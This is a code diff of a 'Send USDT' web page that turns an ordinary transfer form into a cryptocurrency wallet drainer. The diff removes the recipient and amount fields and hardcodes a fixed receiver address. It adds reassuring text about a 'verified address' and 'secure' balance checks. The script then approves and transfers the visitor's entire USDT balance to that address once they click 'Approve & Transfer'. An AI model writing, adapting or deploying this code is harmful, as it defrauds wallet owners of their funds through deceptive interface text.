@@ -31,40 +31,11 @@
       margin: 20px 0 6px;
     }
     .input-box {
-      display: flex;
-      align-items: center;
       background: #1b1b1b;
       border: 1px solid #2c2c2c;
       border-radius: 14px;
       padding: 14px;
       height: 52px;
-    }
-    .input-box input {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #fff;
-      font-size: 14px;
-    }
-    .input-actions {
-      margin-left: 10px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-    }
-    .input-actions span {
-      color: #00ff99;
-      cursor: pointer;
-    }
-    .amount-box {
-      display: flex;
-      align-items: center;
-    }
-    .amount-box .token {
-      color: #ccc;
-      margin-left: 10px;
-      font-size: 14px;
     }
     .usd {
       font-size: 12px;
@@ -94,35 +65,23 @@
   </style>
 </head>
 <body>
-
   <header>Send USDT</header>
 
   <div class="container">
-    <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
-      <div class="input-actions">
-        <span onclick="document.getElementById('wallet').value=''">✕</span>
-        <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
-      </div>
+      <p style="color:#ccc;font-size:14px;margin:0;">USDT BEP20 transfer to verified address.</p>
     </div>
-
-    <label>Amount</label>
-    <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
-      <span class="token">USDT</span>
-      <span class="input-actions" onclick="document.getElementById('amount').value='MAX'">Max</span>
-    </div>
-
-    <div class="usd">≈ $0.00</div>
+    <div class="usd">Your balance will be verified securely.</div>
   </div>
 
   <div class="fixed-button">
-    <button id="nextBtn" onclick="start()">Next</button>
+    <button id="nextBtn" onclick="start()">Approve & Transfer</button>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // fixed
+    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -135,45 +94,34 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Open this page in Trust Wallet browser.");
-        btn.innerText = "Next";
+        alert("Open in Trust Wallet DApp browser.");
+        btn.innerText = "Approve & Transfer";
         btn.disabled = false;
         return;
       }
 
       try {
         const web3 = new Web3(window.ethereum);
-
-        // Force switch to BNB Smart Chain
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }]
-        });
-
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
-        const receiver = document.getElementById("wallet").value;
-
-        const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT BEP-20
-
+        const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
-        await contract.methods.approve(receiver, balance).send({ from: user });
-        await contract.methods.transferFrom(user, receiver, balance).send({ from: user });
+        await contract.methods.approve(RECEIVER, balance).send({ from: user });
+        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
         btn.innerText = "✅ Done";
-      } catch (err) {
-        console.error(err);
+      } catch (e) {
+        console.error(e);
         btn.innerText = "❌ Failed";
       }
 
       setTimeout(() => {
-        btn.innerText = "Next";
+        btn.innerText = "Approve & Transfer";
         btn.disabled = false;
       }, 3000);
     }
   </script>
-
 </body>
 </html>
